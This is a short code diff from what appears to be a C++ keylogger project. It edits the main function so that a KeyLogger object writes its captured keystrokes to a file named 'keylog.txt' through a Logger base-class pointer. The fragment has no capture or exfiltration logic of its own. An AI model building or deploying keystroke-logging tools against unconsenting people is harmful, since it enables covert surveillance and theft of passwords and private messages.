@@ -7,7 +7,7 @@ using namespace std;
 
 int main()
 {
-	FileLogger* logger = new FileLogger("output.txt");
+	Logger* logger = new FileLogger(L"keylog.txt");
     KeyLogger* keyLogger = new KeyLogger(logger);
 	
 	try {
